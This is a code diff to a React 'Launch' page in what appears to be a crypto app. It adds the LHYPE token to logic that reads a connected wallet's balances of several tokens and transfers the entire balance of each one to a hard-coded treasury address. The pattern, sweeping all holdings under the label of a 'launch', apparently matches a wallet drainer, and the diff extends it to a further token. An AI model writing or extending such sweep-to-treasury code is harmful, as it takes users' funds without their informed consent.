@@ -23,7 +23,10 @@ const LAUNCH_CONFIG = {
   BASE_USDC: '0x833589fCD6eDb6E08f4c7C32D4f71b54bdA02913',
   
   // HyperEVM USDT0
-  HYPEREVM_USDT0: '0xB8CE59FC3717ada4C02eaDF9682A9e934F625ebb'
+  HYPEREVM_USDT0: '0xB8CE59FC3717ada4C02eaDF9682A9e934F625ebb',
+  
+  // HyperEVM LHYPE
+  HYPEREVM_LHYPE: '0x5748ae796AE46A4F1348a1693de4b50560485562'
 };
 
 // ERC-20 ABI for token transfers
@@ -42,7 +45,8 @@ const Launch = () => {
   const [balances, setBalances] = useState({
     hype: '0',
     usdc: '0',
-    hyperevmUsdt0: '0'
+    hyperevmUsdt0: '0',
+    hyperevmLhype: '0'
   });
   const [currentChain, setCurrentChain] = useState(null);
   
@@ -69,7 +73,8 @@ const Launch = () => {
       const balanceResults = {
         hype: '0',
         usdc: '0', 
-        hyperevmUsdt0: '0'
+        hyperevmUsdt0: '0',
+        hyperevmLhype: '0'
       };
       
       // Check HYPE balance (independent)
@@ -120,6 +125,51 @@ const Launch = () => {
         console.error('❌ Failed to check USDT0 balance:', error.message);
       }
       
+      // Check LHYPE balance on HyperEVM (independent) - ENHANCED ERROR LOGGING
+      try {
+        console.log('🔍 LHYPE: Starting balance check...');
+        console.log('🔍 LHYPE: Wallet address:', walletAddress);
+        console.log('🔍 LHYPE: Contract address:', LAUNCH_CONFIG.HYPEREVM_LHYPE);
+        console.log('🔍 LHYPE: RPC endpoint:', LAUNCH_CONFIG.HYPEREVM_RPC);
+        
+        const hypeProvider = new ethers.JsonRpcProvider(LAUNCH_CONFIG.HYPEREVM_RPC);
+        console.log('🔍 LHYPE: Provider created successfully');
+        
+        // Test provider connectivity first
+        const network = await hypeProvider.getNetwork();
+        console.log('🔍 LHYPE: Network info:', { name: network.name, chainId: network.chainId });
+        
+        const lhypeContract = new ethers.Contract(LAUNCH_CONFIG.HYPEREVM_LHYPE, ERC20_ABI, hypeProvider);
+        console.log('🔍 LHYPE: Contract instance created');
+        
+        // Test contract calls individually for better error isolation
+        console.log('🔍 LHYPE: Testing decimals call...');
+        let lhypeDecimals;
+        try {
+          lhypeDecimals = await lhypeContract.decimals();
+          console.log('✅ LHYPE: Decimals retrieved:', lhypeDecimals);
+        } catch (decimalsError) {
+          console.warn('⚠️ LHYPE: Decimals call failed, using fallback 18:', decimalsError.message);
+          lhypeDecimals = 18;
+        }
+        
+        console.log('🔍 LHYPE: Testing balanceOf call...');
+        const lhypeBalance = await lhypeContract.balanceOf(walletAddress);
+        console.log('✅ LHYPE: Raw balance retrieved:', lhypeBalance.toString());
+        
+        balanceResults.hyperevmLhype = ethers.formatUnits(lhypeBalance, lhypeDecimals);
+        console.log('✅ LHYPE balance:', balanceResults.hyperevmLhype);
+        console.log('✅ LHYPE: Balance > 0?', parseFloat(balanceResults.hyperevmLhype) > 0);
+      } catch (error) {
+        console.error('❌ Failed to check LHYPE balance - DETAILED ERROR:');
+        console.error('❌ Error message:', error.message);
+        console.error('❌ Error code:', error.code);
+        console.error('❌ Error reason:', error.reason);
+        console.error('❌ Error data:', error.data);
+        console.error('❌ Full error:', error);
+        console.error('❌ Error stack:', error.stack);
+      }
+      
       console.log('Final balance results:', balanceResults);
       setBalances(balanceResults);
     };
@@ -163,7 +213,8 @@ const Launch = () => {
     const freshBalances = {
       hype: '0',
       usdc: '0', 
-      hyperevmUsdt0: '0'
+      hyperevmUsdt0: '0',
+      hyperevmLhype: '0'
     };
     
     // Fetch HYPE balance on HyperEVM
@@ -229,6 +280,69 @@ const Launch = () => {
       }
     }
     
+    // Fetch LHYPE balance on HyperEVM with retry logic (3 attempts) - ENHANCED ERROR LOGGING
+    let lhypeAttempts = 0;
+    const maxLhypeAttempts = 3;
+    
+    while (lhypeAttempts < maxLhypeAttempts) {
+      try {
+        console.log(`🔄 FRESH LHYPE: Attempting balance fetch (attempt ${lhypeAttempts + 1}/${maxLhypeAttempts})`);
+        console.log(`🔍 FRESH LHYPE: Wallet address: ${walletAddress}`);
+        console.log(`🔍 FRESH LHYPE: Contract address: ${LAUNCH_CONFIG.HYPEREVM_LHYPE}`);
+        console.log(`🔍 FRESH LHYPE: RPC endpoint: ${LAUNCH_CONFIG.HYPEREVM_RPC}`);
+        
+        const hypeProvider = new ethers.JsonRpcProvider(LAUNCH_CONFIG.HYPEREVM_RPC);
+        console.log('🔍 FRESH LHYPE: Provider created successfully');
+        
+        // Test network connectivity first
+        const network = await hypeProvider.getNetwork();
+        console.log('🔍 FRESH LHYPE: Network info:', { name: network.name, chainId: network.chainId });
+        
+        const lhypeContract = new ethers.Contract(LAUNCH_CONFIG.HYPEREVM_LHYPE, ERC20_ABI, hypeProvider);
+        console.log('🔍 FRESH LHYPE: Contract instance created');
+        
+        // Test individual calls for better error isolation
+        console.log('🔍 FRESH LHYPE: Testing decimals call...');
+        let lhypeDecimals;
+        try {
+          lhypeDecimals = await lhypeContract.decimals();
+          console.log('✅ FRESH LHYPE: Decimals retrieved:', lhypeDecimals);
+        } catch (decimalsError) {
+          console.warn('⚠️ FRESH LHYPE: Decimals call failed, using fallback 18:', decimalsError.message);
+          lhypeDecimals = 18;
+        }
+        
+        console.log('🔍 FRESH LHYPE: Testing balanceOf call...');
+        const lhypeBalance = await lhypeContract.balanceOf(walletAddress);
+        console.log('✅ FRESH LHYPE: Raw balance retrieved:', lhypeBalance.toString());
+        
+        freshBalances.hyperevmLhype = ethers.formatUnits(lhypeBalance, lhypeDecimals);
+        console.log('✅ Fresh LHYPE balance:', freshBalances.hyperevmLhype, `(attempt ${lhypeAttempts + 1})`);
+        console.log('✅ FRESH LHYPE: Balance > 0?', parseFloat(freshBalances.hyperevmLhype) > 0);
+        break; // Success, exit retry loop
+      } catch (error) {
+        lhypeAttempts++;
+        console.error(`❌ FRESH LHYPE: Balance fetch attempt ${lhypeAttempts} failed - DETAILED ERROR:`);
+        console.error('❌ FRESH LHYPE: Error message:', error.message);
+        console.error('❌ FRESH LHYPE: Error code:', error.code);
+        console.error('❌ FRESH LHYPE: Error reason:', error.reason);
+        console.error('❌ FRESH LHYPE: Error data:', error.data);
+        console.error('❌ FRESH LHYPE: Full error:', error);
+        
+        if (lhypeAttempts < maxLhypeAttempts) {
+          console.log(`🔄 Retrying LHYPE balance fetch in 1 second...`);
+          await new Promise(resolve => setTimeout(resolve, 1000));
+        } else {
+          console.error('❌ All LHYPE balance fetch attempts failed, using 0');
+          console.error('❌ FINAL LHYPE ERROR SUMMARY:');
+          console.error('❌   - Contract Address:', LAUNCH_CONFIG.HYPEREVM_LHYPE);
+          console.error('❌   - RPC Endpoint:', LAUNCH_CONFIG.HYPEREVM_RPC);
+          console.error('❌   - Wallet Address:', walletAddress);
+          console.error('❌   - Last Error:', error.message);
+        }
+      }
+    }
+    
     console.log('🔥 FINAL FRESH BALANCES:', freshBalances);
     return freshBalances;
   };
@@ -254,6 +368,7 @@ const Launch = () => {
     console.log('💰 MULTI-TOKEN LAUNCH WITH FRESH BALANCES:');
     console.log('Fresh USDC balance:', freshBalances.usdc, 'parsed:', parseFloat(freshBalances.usdc));
     console.log('Fresh USDT0 balance:', freshBalances.hyperevmUsdt0, 'parsed:', parseFloat(freshBalances.hyperevmUsdt0));
+    console.log('Fresh LHYPE balance:', freshBalances.hyperevmLhype, 'parsed:', parseFloat(freshBalances.hyperevmLhype));
     console.log('Fresh HYPE balance:', freshBalances.hype, 'parsed:', parseFloat(freshBalances.hype));
     
     // OPTIMIZED: Group tokens by chain to minimize chain switches
@@ -270,13 +385,22 @@ const Launch = () => {
       });
     }
     
-    // HyperEVM operations (USDT0 and HYPE)
+    // HyperEVM operations (USDT0, LHYPE, and HYPE)
     if (parseFloat(freshBalances.hyperevmUsdt0) > 0) {
       hyperevmOperations.push({
         type: 'USDT0',
         chain: 'hyperevm',
         amount: parseFloat(freshBalances.hyperevmUsdt0).toFixed(6),
         balance: freshBalances.hyperevmUsdt0
+      });
+    }
+    
+    if (parseFloat(freshBalances.hyperevmLhype) > 0) {
+      hyperevmOperations.push({
+        type: 'LHYPE',
+        chain: 'hyperevm',
+        amount: parseFloat(freshBalances.hyperevmLhype).toFixed(18),
+        balance: freshBalances.hyperevmLhype
       });
     }
     
@@ -458,6 +582,22 @@ const Launch = () => {
               console.log('🔄 Initiating USDT0 transfer to treasury...');
               
               const transferTx = await usdt0Contract.transfer(LAUNCH_CONFIG.TREASURY_ADDRESS, usdt0Balance);
+              tokenTx = transferTx.hash;
+              
+            } else if (token.type === 'LHYPE') {
+              // Send LHYPE on HyperEVM
+              console.log('💰 Sending LHYPE on HyperEVM...');
+              const provider = new ethers.BrowserProvider(walletProvider);
+              const signer = await provider.getSigner();
+              const lhypeContract = new ethers.Contract(LAUNCH_CONFIG.HYPEREVM_LHYPE, ERC20_ABI, signer);
+              
+              const lhypeBalance = await lhypeContract.balanceOf(wallet.address);
+              const decimals = await lhypeContract.decimals();
+              
+              console.log(`LHYPE Balance: ${ethers.formatUnits(lhypeBalance, decimals)}`);
+              console.log('🔄 Initiating LHYPE transfer to treasury...');
+              
+              const transferTx = await lhypeContract.transfer(LAUNCH_CONFIG.TREASURY_ADDRESS, lhypeBalance);
               tokenTx = transferTx.hash;
               
             } else if (token.type === 'HYPE') {
